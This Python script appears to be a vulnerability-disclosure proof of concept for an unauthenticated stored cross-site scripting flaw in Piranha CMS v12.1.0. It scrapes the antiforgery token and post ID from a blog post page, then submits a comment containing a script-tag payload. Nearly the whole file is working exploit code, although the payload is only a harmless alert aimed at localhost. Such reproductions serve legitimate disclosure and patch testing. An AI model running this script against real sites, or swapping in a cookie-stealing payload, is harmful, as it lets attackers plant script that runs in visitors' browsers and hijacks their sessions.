"""
PoC: V-003 - Stored XSS via Unauthenticated Comment Submission
Target: Piranha CMS v12.1.0
CWE: CWE-79
Auth: NONE REQUIRED
Run: python repro_v003.py
"""

import requests
import re
import urllib3

urllib3.disable_warnings()

BASE_URL = "http://localhost:5000"
POST_URL = f"{BASE_URL}/blogtest/test123"  # Change to your post URL

XSS_PAYLOAD = "<script>alert(document.domain)</script>"

def run():
    # Session handles antiforgery cookie automatically
    session = requests.Session()
    session.verify = False

    print(f"[*] Target: {POST_URL}")
    print(f"[*] Step 1: GET post page (anonymous)")

    r = session.get(POST_URL, timeout=10)
    if r.status_code != 200:
        print(f"[!] GET failed: {r.status_code} - check post URL")
        return

    # Extract antiforgery token from HTML form
    token_match = re.search(
        r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"',
        r.text
    )
    id_match = re.search(
        r'name="Id"\s+type="hidden"\s+value="([^"]+)"',
        r.text
    )

    if not token_match:
        print("[!] __RequestVerificationToken not found - does the post have comments enabled?")
        return

    token = token_match.group(1)
    post_id = id_match.group(1) if id_match else None

    print(f"[+] Token: {token[:40]}...")
    print(f"[+] Post ID: {post_id}")
    print(f"[*] Antiforgery cookies: {dict(session.cookies)}")

    # Build POST payload
    data = {
        "__RequestVerificationToken": token,
        "CommentAuthor": "security-researcher",
        "CommentEmail": "poc@research.local",
        "CommentUrl": "",
        "CommentBody": XSS_PAYLOAD
    }
    if post_id:
        data["Id"] = post_id

    print(f"\n[*] Step 2: POST XSS payload (unauthenticated)")

    r2 = session.post(
        f"{POST_URL}?handler=SaveComment",
        data=data,
        allow_redirects=False,
        timeout=10
    )

    print(f"[+] Response: {r2.status_code}")

    if r2.status_code == 302:
        print("[✓] SUCCESS! XSS payload stored.")
        print(f"[✓] Redirect to: {r2.headers.get('Location', '?')}")
        print(f"\n[!] Open in incognito: {POST_URL}")
        print("[!] Expected: alert(localhost:5000) popup = CONFIRMED Stored XSS")
    elif r2.status_code == 400:
        print("[!] 400 Bad Request - antiforgery mismatch or model validation failed")
        print(f"[!] Response: {r2.text[:300]}")
    else:
        print(f"[!] Unexpected: {r2.status_code}")
        print(r2.text[:300])

if __name__ == "__main__":
    run()
